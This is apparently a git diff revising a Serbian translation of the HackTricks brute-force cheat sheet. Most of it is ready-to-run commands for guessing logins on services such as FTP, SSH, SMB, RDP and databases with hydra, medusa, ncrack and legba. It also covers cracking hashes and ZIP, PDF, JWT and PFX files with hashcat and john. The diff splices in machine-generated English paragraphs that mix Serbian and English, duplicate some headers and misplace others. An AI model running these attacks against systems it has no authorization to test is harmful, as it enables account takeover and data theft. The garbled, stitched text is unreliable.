@@ -1,23 +1,23 @@
 # Brute Force - Šema prečica
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
-Pristupite danas:
+Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
+Dobijte pristup danas:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od početnika do stručnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* Otkrijte [**Porodičnu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
@@ -37,7 +37,7 @@ Drugi načini podrške HackTricks-u:
 * [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
 * [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
 * [**https://many-passwords.github.io/**](https://many-passwords.github.io)
-* [**https://theinfocentric.com/**](https://theinfocentric.com/)
+* [**https://theinfocentric.com/**](https://theinfocentric.com/) 
 
 ## **Napravite svoje rečnike**
 
@@ -60,7 +60,7 @@ cewl example.com -m 5 -w words.txt
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Generišite šifre na osnovu vašeg znanja o žrtvi (imena, datumi...)
+Generišite lozinke na osnovu vašeg znanja o žrtvi (imena, datumi...)
 ```
 python3 cupp.py -h
 ```
@@ -100,17 +100,17 @@ Finished in 0.920s.
 * [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 * [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
-Dobijte pristup danas:
+Pristupite danas:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## Usluge
 
-Poređane abecednim redom po imenu usluge.
+Poređane abecedno po imenu usluge.
 
 ### AFP
 ```bash
@@ -122,8 +122,6 @@ msf> set PASS_FILE <PATH_PASSWDS>
 msf> set USER_FILE <PATH_USERS>
 msf> run
 ```
-### AJP
-
 ### AJP
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
@@ -152,10 +150,6 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/word
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 ### FTP
-
----
-
-Brute-forcing FTP credentials is a common technique used to gain unauthorized access to FTP servers. Attackers use automated tools to try a large number of username and password combinations until they find the correct one. This can be mitigated by enforcing strong password policies, limiting login attempts, and implementing account lockout mechanisms.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
@@ -179,8 +173,6 @@ legba http.ntlm1 --domain example.org --workstation client --username admin --pa
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
 ### HTTP - Post Form
-
-### HTTP - Pošalji obrazac
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
@@ -193,8 +185,6 @@ cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
 ### IMAP
-
-IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. When a hacker is attempting to gain unauthorized access to an email account, they may use a brute force attack to guess the account password. This involves trying many different password combinations until the correct one is found. IMAP servers may have security measures in place to prevent or limit brute force attacks, such as account lockouts after multiple failed login attempts.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -203,9 +193,7 @@ legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 ### IRC
 
----
-
-Internet Relay Chat (IRC) je protokol za real-time razmenu poruka na Internetu. Brute force napadi na IRC servere mogu biti izvršeni korišćenjem alata poput Hydra ili Medusa. Ovi alati mogu pokušati različite kombinacije korisničkih imena i lozinki kako bi dobili neovlašćen pristup IRC serveru. Kada se koristi brute force napad na IRC server, važno je voditi računa o zakonitosti i etičnosti takvih aktivnosti.
+### IRC
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
@@ -272,7 +260,7 @@ legba mysql --username root --password wordlists/passwords.txt --target localhos
 ```
 ### OracleSQL
 
-Brute-force attacks against OracleSQL databases can be carried out using tools like Hydra, Metasploit, or custom scripts. These tools can automate the process of trying different username and password combinations until the correct one is found. It is important to note that brute-force attacks can be time-consuming and resource-intensive, and may trigger security alerts if not done carefully.
+### OracleSQL
 ```bash
 patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
 
@@ -296,11 +284,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-Da biste koristili **oracle\_login** sa **patator**-om, potrebno je **instalirati**:
+Da biste koristili **oracle\_login** sa **patatorom**, potrebno je **instalirati**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Bruteforceovanje hešova OracleSQL-a van mreže](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**verzije 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** i **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**verzije 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** i **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -318,8 +306,6 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
 ### PostgreSQL
-
-PostgreSQL je moćan sistem za upravljanje bazama podataka koji se često koristi u aplikacijama. Kada pokušavate da probijete bazu podataka PostgreSQL, jedna od osnovnih tehnika je "brute force" napad. Ovaj napad uključuje automatsko isprobavanje različitih kombinacija korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija za pristup bazi podataka. Ovo može biti vremenski zahtevan proces, ali može biti efikasan ako se koriste pravilno podešene alatke i tehnike.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -350,6 +336,8 @@ hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
 legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
 ```
 ### Rexec
+
+### Rexec
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
@@ -358,6 +346,16 @@ hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 ### Rsh
+
+---
+
+Brute force attacks against the Rsh service can be carried out using the `rsh-brute` script in Nmap. This script performs a dictionary attack against Rsh servers to guess usernames and passwords. An example of how to use this script is shown below:
+
+```bash
+nmap --script rsh-brute <target>
+```
+
+This script can be useful during penetration testing to identify weak credentials on Rsh servers.
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
@@ -386,15 +384,13 @@ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ta
 ```
 ### SMB
 
-SMB (Server Message Block) je protokol za deljenje fajlova koji se često koristi u Windows okruženjima. Brute force napadi na SMB servere mogu biti efikasni u otkrivanju slabih lozinki ili probijanju lozinki.
+### SMB
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
 ### SMTP
-
-SMTP (Simple Mail Transfer Protocol) je standardni protokol za slanje elektronske pošte preko interneta. Kada se koristi u kontekstu hakovanja, brute force napadi se mogu koristiti za pokušaj pristupa SMTP serveru kroz isprobavanje različitih kombinacija korisničkih imena i lozinki. Ovo može biti efikasan način za otkrivanje slabih lozinki ili nedovoljno zaštićenih SMTP servera.
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
@@ -409,8 +405,6 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 # With alternative address
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-### SQL Server
-
 ### SQL Server
 ```bash
 #Use the NetBIOS name of the machine as domain
@@ -432,9 +426,9 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Slabe SSH ključeve / Predvidljivi PRNG u Debianu
+#### Slabe SSH ključeve / Debian predvidljiv PRNG
 
-Neke sisteme imaju poznate nedostatke u slučajnom semenu koje se koristi za generisanje kriptografskog materijala. To može rezultirati dramatično smanjenim prostorom ključeva koji se mogu probiti alatima poput [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Pre-generisani setovi slabih ključeva takođe su dostupni, poput [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Neke sisteme karakterišu poznate slabosti u slučajnom semenu koje se koristi za generisanje kriptografskog materijala. Ovo može rezultirati dramatično smanjenim prostorom ključeva koji se mogu probiti alatima poput [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Pre-generisani setovi slabih ključeva takođe su dostupni, poput [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ i OpenMQ)
 
@@ -444,7 +438,7 @@ legba stomp --target localhost:61613 --username admin --password data/passwords.
 ```
 ### Telnet
 
-Telnet je jednostavan protokol za udaljeni pristup koji se može koristiti za testiranje brute force napada.
+Telnet je jednostavan protokol za udaljeni pristup koji se može koristiti za testiranje brute force napada. Brute force napad na Telnet server može biti efikasan ako su lozinke slabe ili nisu pravilno konfigurisane.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -478,7 +472,7 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
@@ -488,10 +482,10 @@ Pristupite danas:
 
 ## Lokalno
 
-### Online baze za dešifrovanje
+### Online baze za probijanje
 
 * [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 sa/bez ESS/SSP i sa bilo kojom vrednošću izazova)
+* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 sa/ili bez ESS/SSP i sa bilo kojom vrednošću izazova)
 * [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Heševi, WPA2 snimci i arhive MSOffice, ZIP, PDF...)
 * [https://crackstation.net/](https://crackstation.net) (Heševi)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
@@ -502,7 +496,7 @@ Pristupite danas:
 * [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 * [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Proverite ovo pre nego što pokušate da izvršite **bruteforce** napad na heš.
+Proverite ovo pre nego što pokušate da probijete heš.
 
 ### ZIP
 ```bash
@@ -548,7 +542,9 @@ apt-get install libcompress-raw-lzma-perl
 ```
 ### PDF
 
-### PDF
+---
+
+Brute-force napadi su jedna od najjednostavnijih metoda napada na autentikaciju. Ovi napadi se oslanjaju na pokušaje svih mogućih kombinacija lozinki dok se ne pronađe odgovarajuća. Postoje alati koji mogu automatizovati ovaj proces i ubrzati pronalaženje ispravne lozinke. Kako bi se zaštitili od ovakvih napada, preporučuje se korišćenje jakih i složenih lozinki, kao i implementacija dodatnih sigurnosnih mehanizama poput dvostruke autentikacije.
 ```bash
 apt-get install pdfcrack
 pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
@@ -557,7 +553,7 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### Vlasnik lozinke PDF-a
+### Vlasnička lozinka PDF-a
 
 Da biste probili vlasničku lozinku PDF-a, pogledajte ovde: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
@@ -573,7 +569,7 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-### NTLM krckanje
+### NTLM krakovanje
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
@@ -655,7 +651,7 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
@@ -681,7 +677,7 @@ hash-identifier
 
 ### **Alati za generisanje wordlisti**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredni generator šetnje tastaturom sa konfigurabilnim osnovnim karakterima, mapom tastera i rutama.
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredni generator šetnje tastaturom sa konfigurabilnim osnovnim karakterima, keymap-om i rutama.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -696,7 +692,7 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Hashcat napadi
 
-* **Napad rečnikom** (`-a 0`) sa pravilima
+* **Napad sa listom reči** (`-a 0`) sa pravilima
 
 **Hashcat** već dolazi sa **folderom koji sadrži pravila** ali možete pronaći [**druga zanimljiva pravila ovde**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
@@ -760,67 +756,72 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-### Brute Forcing Linux Hashes - /etc/shadow file
+### Brute Forcing
 
-Krekovanje Linux heševa - fajl /etc/shadow
+Brute forcing is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. When it comes to cracking Linux hashes from the `/etc/shadow` file, brute forcing can be a powerful method to recover passwords. There are various tools available that can automate the brute forcing process, such as John the Ripper and Hashcat. These tools use different algorithms and techniques to efficiently crack passwords. It is important to use strong wordlists and rules to increase the chances of success when brute forcing Linux hashes.
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-# Brute Force
-
 ## Brute Forcing Windows Hashes
 
-Brute forcing Windows hashes involves using tools like **John the Ripper** or **Hashcat** to crack the password hashes obtained from Windows systems. These tools can perform dictionary attacks, where they try a list of commonly used passwords, or brute force attacks, where they try every possible combination of characters to crack the hash.
+### Introduction
 
-### Steps to Brute Force Windows Hashes:
+When it comes to cracking Windows hashes, one of the most common methods is brute forcing. This technique involves trying all possible combinations of characters until the correct password is found. In this section, we will discuss how to perform brute force attacks on Windows hashes.
 
-1. **Obtain Hashes**: Obtain the password hashes from the Windows system you want to crack.
+### Tools
 
-2. **Choose a Tool**: Select a suitable tool like **John the Ripper** or **Hashcat** for cracking the hashes.
+There are several tools available for brute forcing Windows hashes, such as **John the Ripper** and **Hashcat**. These tools are capable of running through millions of password combinations in a relatively short amount of time.
 
-3. **Select Attack Type**: Decide whether to use a dictionary attack or a brute force attack based on the complexity of the password.
+### Methodology
 
-4. **Run the Tool**: Run the selected tool with the necessary parameters to start the brute force process.
+1. **Capture the Hash**: The first step is to obtain the Windows hash that you want to crack. This can be done by extracting the hash from the Windows SAM file or by using tools like **Mimikatz** to dump the hashes from memory.
 
-5. **Wait for Results**: Depending on the complexity of the password and the computing power available, the tool will eventually crack the hash.
+2. **Choose a Tool**: Select a suitable tool for brute forcing the hash. **John the Ripper** is a popular choice for this purpose.
 
-6. **Access the Password**: Once the tool successfully cracks the hash, you will have access to the plaintext password.
+3. **Create Wordlist**: Generate a wordlist that contains potential passwords to try during the brute force attack. This wordlist can be created using tools like **Crunch** or **Cewl**.
 
-By following these steps, you can successfully brute force Windows hashes and gain access to the passwords stored on Windows systems.
+4. **Initiate Brute Force Attack**: Use the chosen tool to start the brute force attack against the Windows hash. The tool will systematically try all possible password combinations until the correct one is found.
+
+5. **Crack the Hash**: Once the tool successfully cracks the hash, the plaintext password will be revealed. This password can then be used to gain unauthorized access to the Windows system.
+
+### Conclusion
+
+Brute forcing Windows hashes can be a time-consuming process, especially if the password is complex. However, with the right tools and techniques, it is possible to crack even the most secure passwords. It is important to use this knowledge responsibly and only for ethical hacking purposes.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
 ## Brute-Force
 
-### Introduction
+### Dictionary Attacks
 
-Brute-force attacks are a common method used to crack hashes. This technique involves trying all possible combinations of characters until the correct one is found. Brute-force attacks can be time-consuming but are effective against weak passwords.
+Dictionary attacks are a type of brute-force attack that uses a predefined list of words as potential passwords. These attacks are usually more efficient than traditional brute-force attacks because they do not need to try every possible combination of characters. Instead, they only try words that are likely to be used as passwords.
 
-### Tools
+#### Tools
 
-There are various tools available for conducting brute-force attacks, such as Hashcat, John the Ripper, and Hydra. These tools allow you to automate the process of trying different combinations quickly and efficiently.
+- **John the Ripper**: A popular password-cracking tool that can perform dictionary attacks among other types of attacks.
+- **Hashcat**: Another powerful password-cracking tool that supports dictionary attacks.
 
-### Methodology
+### Brute-Force Attacks
 
-1. **Select Target Hash**: Obtain the hash of the target application you want to crack.
+Brute-force attacks systematically try every possible combination of characters until the correct password is found. These attacks can be very time-consuming and resource-intensive, especially for longer and more complex passwords.
 
-2. **Choose Brute-Force Tool**: Select a suitable brute-force tool based on the type of hash you are trying to crack.
+#### Tools
 
-3. **Set Parameters**: Configure the tool with the necessary parameters, such as character set, minimum and maximum password length, etc.
+- **Hydra**: A fast and flexible password-cracking tool that supports various protocols and services.
+- **Medusa**: Similar to Hydra, Medusa is a speedy, parallel password-cracking tool.
 
-4. **Initiate Attack**: Start the brute-force attack and let the tool try different combinations until the correct one is found.
+### Rainbow Tables
 
-5. **Crack the Hash**: Once the correct password is identified, you have successfully cracked the hash.
+Rainbow tables are precomputed tables used in password-cracking to accelerate the cracking process by reversing cryptographic hash functions. Instead of computing the hash of each possible password, rainbow tables store precomputed hashes of commonly used passwords.
 
-### Tips
+#### Tools
 
-- Use a good wordlist: Having a quality wordlist can significantly increase the chances of cracking the hash.
-- Understand the hash type: Different hash algorithms require different approaches, so it's essential to know the type of hash you are dealing with.
-- Be patient: Brute-force attacks can take time, especially for complex passwords. Patience is key to successfully cracking hashes.
+- **RainbowCrack**: A tool that can generate and use rainbow tables to crack password hashes.
+- **Ophcrack**: A Windows-based password cracker that uses rainbow tables to perform password-cracking attacks.
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -834,7 +835,7 @@ There are various tools available for conducting brute-force attacks, such as Ha
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Drugi načini podrške HackTricks-u:
+Drugi načini da podržite HackTricks:
 
 * Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
@@ -844,10 +845,10 @@ Drugi načini podrške HackTricks-u:
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
+Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako kreirate i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
 Dobijte pristup danas:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
